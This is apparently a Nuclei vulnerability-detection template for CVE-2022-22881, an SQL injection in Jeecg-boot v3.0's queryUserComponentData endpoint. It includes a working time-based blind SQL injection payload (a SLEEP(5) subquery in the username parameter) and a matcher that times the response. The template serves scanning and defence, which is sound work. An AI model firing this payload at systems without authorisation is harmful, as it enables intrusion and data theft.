id: CVE-2022-22881

info:
  name: Jeecg-boot SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    SQL injection vulnerability via the code parameter in /sys/user/queryUserComponentData in Jeecg-boot v3.0.
  remediation: |
    To remediate this issue, ensure proper input validation and parameterized queries are implemented. Avoid concatenating user inputs directly into SQL queries. Apply security patches provided by the vendor.
  reference:
    - https://github.com/jeecgboot/jeecg-boot/issues/3348

http:
  - method: GET
    path:
      - "{{BaseURL}}/jeecg-boot/sys/user/queryUserComponentData?_t=1641263644&pageNo=1&pageSize=10&departId=5159cde220114246b045e574adceafe9&realname=admin&username=admin'%20AND%20(SELECT%209361%20FROM%20(SELECT(SLEEP(5)))oFxU)--%20"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "queryUserComponentData"

      - type: dsl
        dsl:
          - "duration > 5"
